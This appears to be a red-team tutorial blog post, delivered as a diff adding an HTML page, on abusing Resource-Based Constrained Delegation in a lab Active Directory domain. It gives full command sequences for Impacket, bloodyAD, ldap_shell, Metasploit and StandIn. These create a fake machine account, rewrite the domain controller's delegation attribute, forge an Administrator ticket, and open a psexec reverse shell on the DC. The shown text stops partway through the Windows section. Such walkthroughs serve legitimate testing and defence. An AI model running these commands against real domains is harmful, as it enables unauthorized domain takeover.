@@ -1,0 +1,249 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/domain-escalation/" rel="category tag">Domain Escalation</a>, <a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Domain Escalation: Resource Based Constrained Delegation</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/" rel="bookmark"><time class="entry-date published" datetime="2022-03-12T18:09:30+00:00">March 12, 2022</time><time class="updated" datetime="2025-06-23T19:39:41+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><strong data-start="259" data-end="307">Resource-Based Constrained Delegation (RBCD)</strong> is a security feature in <strong data-start="333" data-end="358">Active Directory (AD)</strong> that allows a computer object to specify which users or machines can impersonate accounts to access its resources. This delegation method provides more <strong data-start="511" data-end="531">granular control</strong> compared to older <strong data-start="550" data-end="567">unconstrained</strong> and <strong data-start="572" data-end="598">constrained delegation</strong> methods. However, attackers can exploit <strong data-start="639" data-end="661">misconfigured RBCD</strong> to gain unauthorized access and escalate privileges within a domain.</span></p>
+<p><span style="color: #000000;">This guide will provide an in-depth explanation of RBCD, covering its working mechanism, the key attributes involved, and how attackers exploit it. Additionally, we will demonstrate an attack scenario where an attacker manipulates delegation settings to gain control over a privileged account.</span></p>
+<h3><span style="color: #800000;">Table of Contents</span></h3>
+<ul>
+<li><span style="color: #000000;">Resource Based Constrained Delegation</span></li>
+<li><span style="color: #000000;">Prerequisites</span></li>
+<li><span style="color: #000000;">Lab Setup</span></li>
+<li><span style="color: #000000;">Exploitation Phase</span></li>
+<li><span style="color: #000000;">Bloodhound – Hunting for Weak Permission</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Method for Exploitation</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Impacket</span></li>
+<li><span style="color: #000000;">Bloody AD</span></li>
+<li><span style="color: #000000;">Ldap_shell</span></li>
+<li><span style="color: #000000;">Metasploit</span></li>
+<li><span style="color: #000000;">PowerShell – Powerview</span></li>
+<li><span style="color: #000000;">Rubeus</span></li>
+</ul>
+<h3><span style="color: #800000;">Understanding RBCD</span></h3>
+<h4><span style="color: #000000;">Delegation in Active Directory</span></h4>
+<p><span style="color: #000000;">Delegation in Active Directory allows a service to authenticate on behalf of a user, enabling seamless authentication across multiple services. There are three types of delegation:</span></p>
+<ol>
+<li><span style="color: #000000;"><strong>Unconstrained Delegation:</strong> Any service running on the delegated machine can impersonate users without restrictions.</span></li>
+<li><span style="color: #000000;"><strong>Constrained Delegation:</strong> The delegation is restricted to specific services, limiting potential abuse.</span></li>
+<li><span style="color: #000000;"><strong>Resource-Based Constrained Delegation (RBCD):</strong> Introduced in Windows Server 2012, RBCD enables a resource (e.g., a server) to define which accounts can delegate to it.</span></li>
+</ol>
+<p><span style="color: #000000;">Unlike traditional delegation methods, administrators configure <strong data-start="1026" data-end="1034">RBCD</strong> on the <strong data-start="1042" data-end="1071">target machine (resource)</strong> instead of the <strong data-start="1087" data-end="1103">user account</strong>. As a result, this provides greater <strong data-start="1140" data-end="1155">flexibility</strong> but also introduces <strong data-start="1176" data-end="1185">risks</strong> if misconfigured.</span></p>
+<h4><span style="color: #000000;">How RBCD Works</span></h4>
+<p><span style="color: #000000;">When administrators configure <strong data-start="1240" data-end="1248">RBCD</strong>, they modify the <strong data-start="1266" data-end="1310">msDS-AllowedToActOnBehalfOfOtherIdentity</strong> attribute on the <strong data-start="1328" data-end="1364">target machine’s computer object</strong>. This attribute includes a <strong data-start="1392" data-end="1420">security descriptor (SD)</strong> that specifies which <strong data-start="1442" data-end="1463">users or machines</strong> can perform <strong data-start="1476" data-end="1490">delegation</strong>.</span></p>
+<p><span style="color: #000000;">The RBCD process follows these steps:</span></p>
+<ol>
+<li><span style="color: #000000;">A <strong data-start="1500" data-end="1519">user or machine</strong> gains permission to act on behalf of other identities by modifying the <strong data-start="1591" data-end="1635">msDS-AllowedToActOnBehalfOfOtherIdentity</strong> attribute on the <strong data-start="1653" data-end="1671">target machine</strong>. This change enables delegation capabilities within the <strong data-start="1728" data-end="1748">Active Directory</strong> environment.</span></li>
+<li><span style="color: #000000;">The user requests a <strong>Service for User to Self (S4U2Self)</strong> ticket from the Key Distribution Center (KDC) to impersonate a privileged account.</span></li>
+<li><span style="color: #000000;">The user then requests a <strong>Service for User to Proxy (S4U2Proxy)</strong> ticket, allowing authentication to services running on the target machine.</span></li>
+<li><span style="color: #000000;">The user gains access to the target system as the impersonated account.</span></li>
+</ol>
+<p><span style="color: #000000;">If attackers gain control over a <strong data-start="1801" data-end="1820">computer object</strong> and modify its <strong data-start="1836" data-end="1859">delegation settings</strong>, they can impersonate <strong data-start="1882" data-end="1905">privileged accounts</strong>. Consequently, this action may result in a <strong data-start="1949" data-end="1975">full domain compromise</strong>.</span></p>
+<p><span style="color: #000000;"><strong>Key Active Directory Attribute Used</strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>msDS-AllowedToActOnBehalfOfOtherIdentity:</strong> Stores a security descriptor defining which accounts can use RBCD.</span></li>
+<li><span style="color: #000000;"><strong>TrustAttributes:</strong> Determines whether delegation is enabled on a machine.</span></li>
+<li><span style="color: #000000;"><strong>Service Principal Names (SPNs): </strong>Used in Kerberos authentication to identify services running on a machine. The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, cifs/target.domain or host/target.domain will allow most remote dumping operations.</span></li>
+<li><span style="color: #000000;"><strong>Machine Quota: </strong>The default setting in AD allowing any user to create up to 10 machine accounts.</span></li>
+</ul>
+<h3><span style="color: #800000;">Prerequisites</span></h3>
+<ul>
+<li><span style="color: #000000;">Windows Server 2019 as Active Directory</span></li>
+<li><span style="color: #000000;">Kali Linux</span></li>
+<li><span style="color: #000000;">Tools: Bloodhound, Impacket, Powerview, BloodyAD, Ldap_Shell, Metasploit</span></li>
+<li><span style="color: #000000;">Windows 10/11 – As Client</span></li>
+</ul>
+<h3><span style="color: #800000;">Lab Setup</span></h3>
+<p><span style="color: #000000;"><strong>Create the AD Environment:</strong></span></p>
+<p><span style="color: #000000;">Once you set up your <strong data-start="2004" data-end="2036">Active Directory environment</strong>, assign the <strong data-start="2049" data-end="2062">Geet user</strong> full control over a <strong data-start="2083" data-end="2109">domain controller (DC)</strong>. This access allows it to configure and modify <strong data-start="2157" data-end="2180">delegation settings</strong> as needed.</span></p>
+<p><span style="color: #000000;"><strong>Domain Controller</strong>:</span></p>
+<ul>
+<li><span style="color: #000000;">Install Windows Server (2016 or 2019 recommended).</span></li>
+<li><span style="color: #000000;">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services</strong></span></li>
+<li><span style="color: #000000;">Set up the domain (e.g., <strong>local</strong>).</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>User Accounts</strong>:</span></p>
+<ul>
+<li><span style="color: #000000;">Create a standard user account named<strong> Geet</strong>.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user geet Password@1 /add /domain</pre>
+<p><span style="color: #000000;"><strong>Grant “Geet” User Full Control on the Domain Controller Computer:</strong></span></p>
+<p><span style="color: #000000;">Once you set up your AD environment, grant Geet full control over a domain controller (DC), allowing it to manipulate its delegation settings.</span></p>
+<p><span style="color: #000000;"><strong>Steps</strong>:</span></p>
+<ul>
+<li><span style="color: #000000;">Open <strong>Active Directory Users and Computers</strong> (ADUC) on the Domain Controller.</span></li>
+<li><span style="color: #000000;">Enable the <strong>Advanced Features</strong> view by clicking on <strong>View</strong> &gt; <strong>Advanced Features</strong>.</span></li>
+<li><span style="color: #000000;">Locate the <strong>Domain Controller machine</strong> in the Domain Controller container.</span></li>
+<li><span style="color: #000000;">Right-click on <strong>Domain Controller machine (DC) </strong>and go to <strong>Properties</strong>.</span></li>
+</ul>
+<p><span style="color: #000000;">       <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizXRDxKeaOjMvJvoeh1nloVJ97XD1uDlpH3VJNAPzjuANi3Tliu3f2WGLvCD4SxzFAY3M5Cq-3xCpsZ4aWhvlX5dq8m2ZCfkPn0pPWCa-2tLULZ6Kc-fUR1mEVk42fKI-iAlS2DEzKPupwucxwuHLuEuyXQLVD-07nPPP260g6den06N9D45OxF8obpRC2/s16000/1.png"/></span></p>
+<ul>
+<li><span style="color: #000000;">Go to the <strong>Security</strong>tab, and click on <strong>Add</strong> button</span></li>
+</ul>
+<p><span style="color: #000000;">      <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhG9MitofN7NC76mh52fpV1JZ7kP753FmOGkT-Yo2sOnLrKcDl1tQUZCeix_5D3K0WbyPZIYHyDhgdzpg9_amGMR6IeQMp94zn2L2AOGSOYRYQeplxLWXj2JkrzsrotnDHvIPzd5dVIrkL-KZvYZskF-yrif7y4uuw9YLl-3py34YwbW91RdATb7scnY9vJ/s16000/2.png"/></span></p>
+<ul>
+<li><span style="color: #000000;">In the “Enter the object name to select” box, type <strong>Geet</strong>and click <strong>Check Names </strong>and click on OK.</span></li>
+<li><span style="color: #000000;">Select <strong>Geet </strong>user and in the <strong>Permissions</strong>section, check the box for <strong>Full control</strong> rights</span></li>
+<li><span style="color: #000000;">Apply the settings.</span></li>
+</ul>
+<p><span style="color: #000000;">      <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinbjjJdjFQ58kvCT6xhdTyUAXg525-bsrTEwW8JOfZxKPDBFHz4-HMVwnBOvFge4W8JVapXbuo3ZEuh7QS9ze9vEYeSAg0O4qstO6NQ5_X_1J-E0gyaX7OvcIK1PmlEPBCt3FOaXQ09BK-_R5bNm6IFgGGLuX2AC9JxnMXutXaI0Ny-nk_1pF6OaS3d8EW/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">At this point, <strong>Geet</strong> now has <strong>Full Control </strong>rights over the <strong>Domain controller machine</strong>, allowing it to manipulate its delegation settings.</span></p>
+<h3><span style="color: #800000;">Exploitation Phase</span></h3>
+<h3><span style="color: #000000;">Bloodhound – Hunting for Weak Permission</span></h3>
+<p><span style="color: #000000;"><strong>Use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Geet</strong> has <strong>Full control</strong> permission on the <strong>Domain controller group</strong>, and can perform RBCD attack.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u geet -p Password@1 -ns 192.168.1.48 -d ignite.local -c All</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgB-2f7QP2n_yWCPsDkqEjmByto7SflmHBsEqfEEaI5z0q3OAX-yzJn2szTK9A0M9IFIeMhvnHalzwFfopGxp7dRpngHiJ92h95ZBYDNhQ6D-oMzOkIwrfzNBQ79M3NpcMOSN0ynyI0XLBYvd28aGRz9dg_YypnOt05KZfO4X-kSYV6x45rBCSEBHHZcEtg/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for selected user where the first degree of object control value is equal to 1.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj43-CoTRyz0jRkeuOhfweO2XTmphinH6_EHox1NNgRzydOo2uMNdg9Vy8zh1F4GYAJ6PixeqADW8uWAEHy2oqDvqsYGvUGTb5t8_GcIzdFuecbrEjT0rDU2iXfLbXrny8jvho5llIaFHE0z1i8aob7LvXKk6S4hyphenhyphenpOhLIRaAzDr_9PbDrFM0MmwiWdqyXM/s16000/5.png"/></span></p>
+<p><span style="color: #000000;"><strong data-start="2198" data-end="2212">BloodHound</strong> helps identify <strong data-start="2228" data-end="2260">delegation misconfigurations</strong> in <strong data-start="2264" data-end="2284">Active Directory</strong> that can be exploited during <strong data-start="2314" data-end="2330">RBCD attacks</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3C9lE6C15TgYfCJbThncMTlMGXdOepitC9sbwafybveULMIrqOB8rBcXRWidXEz8FG-ebCRvJgC952M7VCqAooJupQTaQSqmplHuDezoY8bWMJuN9VEFoV_mP5Ou-hqyN6S3OIfskcLm2nb_lcA27nieo46YjssGIHfk2-kvIiZQlCqgsDt444Msq6JL3/s16000/6.png"/></span></p>
+<h3><span style="color: #800000;">Method for Exploitation</span></h3>
+<p><span style="color: #000000;">If you have understood the theoretical concepts, executing an RBCD attack becomes straightforward. The following steps outline the process:</span></p>
+<ul>
+<li><span style="color: #000000;">Create a fake computer account</span></li>
+<li><span style="color: #000000;">Edit the target’s “rbcd” attribute by delegating control on a domain controller (DC) to this fake machine</span></li>
+<li><span style="color: #000000;">Fake computer account acts on behalf of Domain Controller (DC$) account</span></li>
+<li><span style="color: #000000;">Obtain a ticket (delegation operation)</span></li>
+<li><span style="color: #000000;">Once the ticket is obtained, it can be used with pass-the-ticket.</span></li>
+</ul>
+<h3><span style="color: #000000;">Impacket</span></h3>
+<ol>
+<li><span style="color: #000000;"><strong>Abuse MachineAccountQuota to create a computer account</strong></span></li>
+</ol>
+<p><span style="color: #000000;">Since Active Directory allows users to create machine accounts (if MachineAccountQuota &gt; 0), we leverage this to create a new fake machine using the Geet account.</span></p>
+<p><span style="color: #000000;">To do this, we’ll use a relatively new impacket example script – addcomputer.  This script has a SAMR option to add a new computer, which functions over SMB.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-addcomputer ignite.local/geet:Password@1 -computer-name fakepc -computer-pass Password@123 -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjav7g67j30kSn4YYJkSyr8cSGE8IT2rU9ddPvANMnawEoR9oy5yP8u-cmMPX8THYudQ0OybakWZDKuDJ4MZgEQwDjJJu305vDhwdYkmLJvmhyf8QvF_JwQT74Q0YwoxTfKMnfbsmKBEhC0fiF7BmBjdmVKzWdJiK_J_5DjyUdSsbW4QKBE8K8tfAU_6Yzm/s16000/7.png"/></strong></span></p>
+<ol start="2">
+<li><span style="color: #000000;"><strong>Rewrite DC’s AllowedToActOnBehalfOfOtherIdentity properties</strong></span></li>
+</ol>
+<p><span style="color: #000000;">We configure msDS-AllowedToActOnBehalfOfOtherIdentity on the domain controller (DC$), allowing our fake machine account to impersonate users.</span></p>
+<p><span style="color: #000000;">You can use Impacket’s rbcd script to read, write, or clear delegation rights. Make sure you use credentials of a domain user who has the appropriate permissions.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-rbcd ignite.local/geet:Password@1 -action write -delegate-to 'DC$' -delegate-from 'fakepc$' -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCppualQhN5zAwQ8O0VwGR2HQ82eundTeKLsnawCJhLaqtCo7DZMbwXnpN-ylBhbMKB4R92Eu3SfEydtYjThuDo63OqiVZXZKnzNts2CNOdM17cCzZymKF6hUp_utygju5Br4SurQDmf3WZ1Q39qXQSFqAlEFYKzulNsjsIRDBweFrprVl2fhqJOT0e-IH/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Alternatively, the above two setups can be done using:</span></p>
+<h3><span style="color: #800000;">Bloody AD</span></h3>
+<p><span style="color: #000000;">Create a fake computer account</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD -u geet -p 'Password@1' -d ignite.local --host 192.168.1.48 add computer fakecomp 'Password@123'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhlMLTIVwHGZy2t_eG1WD8O8n6sQTe67Et9eKf71Ce2OEzfwpuiktPS8pMyAFr3xtOVX2CAOE0XHGeWaeTI9UWAV5uafA-weedJnZSnSiPWpTHsFSAFpIvx1Bausqfl7egjIr8k-dgJm0Gfk3GkEQsy9v61wd2IavZlpq_mZXHYViXeNpnQl4j5G308NEF8/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Rewrite DC’s AllowedToActOnBehalfOfOtherIdentity properties, to allow the account to act on behalf of the other identity.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host 192.168.1.48 -u geet -p 'Password@1' -d ignite.local add rbcd 'DC$' 'fakecomp$'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWGrTjNKtq64TpM8JIepS17ZPg2c2aOoUPq2ecxaSNr7mWeSDvmdp0pa6QhUDzLTimOSL5PsCb4133Ir1D1kKM93ew1dzab4rBArPoQ0lwJ9EFx1XmhpT7q1sG5FIKkMC81H-SmTsD42aNB4yZLO1SvKxz6XIkNJsJYHg7JlDlXeTtzIN0SMmfyLObP9Nm/s16000/12.png"/></span></p>
+<h3><span style="color: #800000;">Ldap_shell</span></h3>
+<p><span style="color: #000000;">This can also be achieved using <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/PShlyundin/ldap_shell">ldap_shell</a></span></strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldap_shell ignite.local/geet:Password@1 -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000;">Create a fake computer account</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">add_computer testpc Password@123</pre>
+<p><span style="color: #000000;">Allow the account to act on behalf of the other identity</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">set_rbcd DC$ testpc$</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyeGoHj5_RZBK5OAf3dVex4T5yn6bv4ZkJUg0ZYa-L2r8gFaxcPUgjj7OFOAuG3V-GBuhkkbt0daZgTooi5F_bcj9crKvS1Zr-8HNUUO8g-d2P2adovjuAJGjXZJggAO-6Z4_-CXv-Qn03YZrOfUcyAFuEXoGfOfJhtajTlGc8epbwug_N9VeRTSqj-gRl/s16000/15.png"/></span></p>
+<ol start="3">
+<li><span style="color: #000000;"><strong>Generate a Service Ticket for CIFS</strong></span></li>
+</ol>
+<p><span style="color: #000000;">The fake machine account requests a Kerberos Service Ticket for a privileged user (e.g., Administrator) using Service for User to Self (S4U2Self).</span></p>
+<p><span style="color: #000000;">Then, it escalates the ticket using Service for User to Proxy (S4U2Proxy) to obtain access to DC$.</span></p>
+<p><span style="color: #000000;">Once you modify the delegation attribute, you can use the <strong data-start="2664" data-end="2689">Impacket getST script</strong> to obtain a <strong data-start="2702" data-end="2725">Service Ticket (ST)</strong> for impersonation. For instance, you may impersonate the <strong data-start="2783" data-end="2800">Administrator</strong> or any other user within the <strong data-start="2830" data-end="2840">domain</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-getST ignite.local/'fakepc$':Password@123 -spn cifs/DC.ignite.local -impersonate administrator -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuFUI4Rpm_vwKkDYZKwecsJH5azBXEBhhE0-OedtjCIQs5xIMzXuvf7GcLCzbJ_H4smA8Rv2pJvpTVtnpfbAv1ViGkJM9a1HL5Q8nYw5o3JXKCpgmjnw3vFvehAva7GMsgNRazklDwWbOl6LzsZTpWksCxd7SbboP81zcJSY7U6rizgyXyfrTZZ4Etxk2X/s16000/16.png"/></span></p>
+<ol start="4">
+<li><span style="color: #000000;"><strong>Obtain Privileged Access</strong></span></li>
+</ol>
+<p><span style="color: #000000;">After you obtain the <strong data-start="2869" data-end="2888">Kerberos ticket</strong>, you can use it with <strong data-start="2910" data-end="2929">pass-the-ticket</strong> techniques.</span></p>
+<p><span style="color: #000000;">In order to use the ticket, first export an environment variable that points to the created ticket.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=administrator@cifs_dc.ignite.local@IGNITE.LOCAL.ccache
+impacket-psexec ignite.local/administrator@DC.ignite.local -k -no-pass -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXXaDyyAitg9OHWUhUEWlRuTdg9kAEHR5oM3ATHqPtH0xizaL7aTyluI7e3oXxog71blqW7wBctz9ne7gOh-etB0nACZmxbMwEH1Imtn5jb_CY4rRbQRSqxY1S15IuKDqHLStXZy4lrPPG6Ew8mVqk0tW7zBNLj7huF9lZWKa_pkTeHVHVahG7fQ7KAK3J/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">From UNIX-like systems, Impacket’s findDelegation script can be used to find unconstrained, constrained (with or without protocol transition) and rbcd.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Impacket-findDelegation ignite.local/raaj:Password@1 -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQphXzkZ-nr1ZJWEhKbdNbAOKIC9tuyx0JpBAt22k5dL-u2EM4YmOxsAh1itRcPvleI_PNNAnnTCMyA3DVq9CnvS97U-8wjmTFt7Lh-221M3RfK-tkAGWRRIsiDM_KKnmIz4xpZm9v43uP6-fI_6YsS52wmnJMdcSdZyU2_4uauTNwnHXfVPVohWn281g7/s16000/18.png"/></span></p>
+<h3><span style="color: #800000;">Metasploit</span></h3>
+<p><span style="color: #000000;">The above steps can also be achieved using Metasploit:</span></p>
+<p><span style="color: #000000;"><strong>Create a fake computer account</strong></span></p>
+<p><span style="color: #000000;">The admin/dcerpc/samr_account module is generally used to first create a computer account, which by default, all user accounts in a domain can perform.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Use auxiliary/admin/dcerpc/samr_account 
+set SMBUSER geet
+set SMBPASS Password@1
+set ACCOUNT_NAME LOKI$
+set ACCOUNT_PASSWORD Password@123
+set SMBDOMAIN ignite.local
+run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7wjSky554ftz4pkMHn3xleKgubp0-7YUHwQCnfxAL1kSKUkTrgouQ7NLo9yxiMXFHZSlNwWACTh-TDSIxoL_ZBSlrTtwzBmwSrLt48Uc2oCQfKvAjTNIX8c3jO2cWZHrcRBuL_74s493bCdi2Ny4rfoFF8gImUQGSs_MFEYFnpESD9i9_FItXQ9Qqlaso/s16000/25.png"/></span></p>
+<p><span style="color: #000000;"><strong>Rewrite DC’s AllowedToActOnBehalfOfOtherIdentity properties</strong></span></p>
+<p><span style="color: #000000;">You can read and write the msDS-AllowedToActOnBehalfOfOtherIdentity LDAP attribute against a target for Role Based Constrained Delegation (RBCD) using the auxiliary/admin/ldap/rbcd module. When writing, the module will add an access control entry (ACE) to allow the account specified in DELEGATE_FROM to the object specified in DELEGATE_TO.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/ldap/rbcd
+set DELEGATE_FROM LOKI
+set DELEGATE_TO DC
+set DOMAIN ignite.local
+set RHOSTS 192.168.1.48
+set USERNAME geet
+set PASSWORD Password@1
+set ACTION WRITE
+run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5ClJBzWTxHVJaE4yQM79W7GmdSI9t2941V8095MH4lOh-RAbpgKkvX82UsR2CzMi3jZ_U0BhZAcF7jq-ODCMYukmBnMVzi0rs8xE_ImR8PT2NmY8CjjhWKg5-VD79QPB9WoSQTs79PY3iYU89XPMi86Ub_vNm8fT96b5pSzp2qfzopGKP_6Q0FcimQqlq/s16000/26.png"/></span></p>
+<p><span style="color: #000000;"><strong>Generate a Service Ticket for CIFS</strong></span></p>
+<p><span style="color: #000000;">Next, we can use the auxiliary/admin/kerberos/get_ticket module to request a new S4U impersonation ticket for the Administrator account using the previously created machine account. For instance, requesting a service ticket for SMB access.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/kerberos/get_ticket
+set RHOSTS 192.168.1.48
+set IMPERSONATE administrator
+set USERNAME LOKI
+set PASSWORD Password@123
+set ACTION GET_TGS
+set SPN cifs/dc.ignite.local
+run</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiA_NVKQPwdnPM9Yu0uIZ4AFQmCzSgUTmTk7FzUDfqDPOuAd0fo0jqs_4MmAuiGJDVv4bEe83x9lLctuJBTVaK6sSU5XnVD3SVKpNm7buhkcHH-ffHPVKB3iw6Du_VyKS-TE7wLjghgBi6Fkm0x0a_E4ZjX-C-dbwF_rPpYtCo08COK7KFADJebe7sEDdnQ/s16000/27.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>Obtain Privileged Access</strong></span></p>
+<p><span style="color: #000000;">The saved TGS can be used in a pass-the-ticket style attack. For instance using the exploit/windows/smb/psexec module for a reverse shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/psexec
+set RHOSTS 192.168.1.48
+set SMBDOMAIN ignite.local
+set USERNAME administrator
+set SMB::AUTH kerberos
+set SMB::KRB5CCNAME /root/.msf4/loot/20250126094248_default_192.168.1.48_mit.kerberos.cca_426299.bin
+set SMB::RHOSTNAME dc.ignite.local
+set DOMAINCONTROLLERRHOST 192.168.1.48
+set LHOST 192.168.1.128
+run</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjGy5KIsrvi7pO0ss6Yk3m1TP4THcRsEwLS8WvSch5CjI9G7mVD56VDep3L2Is0wOn298FrA7MOobZw352w82dwpZAL99YWTyzkyTiFo7GKxk9885MMKcMcO2YL7YMMNnxZb5NoQwRMpSuqBYGwMn6feCdliZcV8cynzTvRiOjn4RDj4YH04JoEVQ7mTfl/s16000/28.png"/></strong></span></p>
+<p><span style="color: #000000;">The auxiliary/admin/ldap/rbcd can read the value of msDS-AllowedToActOnBehalfOfOtherIdentity to verify that the value is updated.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/ldap/rbcd
+set DOMAIN ignite.local
+set RHOSTS 192.168.1.48
+set USERNAME geet
+set PASSWORD Password@1
+set delegate_to dc
+run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCi2CjWfDHYd3rE9gDJj_VzwHy51OHNJTDee1ef4RHt8FKvA9G8HneTJtevdZ2pu6glBZJBbmi7O5dHcX8ilIS9JWAAsjPfP6CuE3Jzp_BbUrr6mQH1eWl_uAkuuJSpeIr-bDwv7nxUpgm0at9osrNiyMFOg0wyQi_VuoguTHsJAWDd8xKSSz0yhFbA4ST/s16000/30.png"/></span></p>
+<h3><span style="color: #800000;">Windows Exploitation</span></h3>
+<h4><span style="color: #000000;">Create a fake computer account</span></h4>
+<p><span style="color: #000000;">If we’re attacking from Windows FuzzSecurity’s <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/FuzzySecurity/StandIn">StandIn</a> </strong></span>project let us create machine accounts:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\StandIn_v13_Net45.exe --computer panther --make</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXmnGkEMEmbJPawLd_a6o0aa3MOE27C5LeB2TtUxFZbQvzdIhQL8m8ezGGPdpQT86DW3RrmnZVQ6fDhWwl-EeGVxjBGPqaLCfIQzQRTLsr-DXR8HbOed_x-BL7woiRF5DKT5uh7Y_hxJowONwXs305sWo2oL2TsBisL9d3dccuvC74sBQabSSYzaR8LKR0/s16000/40.png"/></span></p>
